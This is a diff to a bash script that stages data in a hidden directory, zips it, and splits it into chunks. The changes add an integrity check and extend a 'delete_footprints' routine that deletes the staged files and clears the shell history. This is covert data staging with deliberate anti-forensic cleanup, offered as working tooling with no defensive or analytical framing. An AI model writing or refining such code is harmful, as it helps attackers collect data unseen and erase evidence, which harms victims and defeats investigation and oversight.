@@ -52,10 +52,22 @@ split_file() {
     split -b "$MAX_FILE_SIZE" "$file_path" "$output_prefix"
 }
 
+# Function to verify ZIP file integrity
+verify_zip_integrity() {
+    local zip_file="$1"
+    if ! unzip -t "$zip_file" > /dev/null; then
+        echo "Error: ZIP file is corrupted."
+        return 1
+    fi
+    return 0
+}
+
 # Function to delete footprints
 delete_footprints() {
     # Delete the hidden directory and its contents
     rm -rf "$HIDDEN_DIRECTORY"
+    # Delete the temporary ZIP file and its parts
+    rm -f "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.zip.part_"*
     # Clear Bash command history
     history -c
 }
@@ -80,6 +92,14 @@ main() {
     # Compress the hidden directory into a ZIP file
     echo "Creating ZIP file..."
     zip -r -9 "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY" > /dev/null
+
+    # Verify ZIP file integrity
+    echo "Verifying ZIP file integrity..."
+    if ! verify_zip_integrity "$HIDDEN_DIRECTORY.zip"; then
+        echo "Error: ZIP file is corrupted. Aborting."
+        delete_footprints
+        exit 1
+    fi
 
     # Split the ZIP file into smaller chunks
     echo "Splitting ZIP file..."
